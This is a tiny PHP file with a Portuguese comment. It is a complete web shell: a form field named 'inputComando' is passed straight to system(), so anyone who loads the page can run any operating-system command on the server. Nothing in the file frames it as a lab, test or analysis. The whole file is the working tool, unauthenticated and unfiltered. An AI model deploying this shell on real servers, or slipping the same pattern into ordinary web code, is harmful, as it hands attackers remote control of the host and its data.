<?php 
	if ($_SERVER["REQUEST_METHOD"] === "POST")
	{
		$comando = $_POST["inputComando"];
		// essa função executa funções do sistema
		system($comando);
	}

?>
<form method = "POST">
	<input type = "text" name = "inputComando">
	<button>ENVIAR</button>
</form>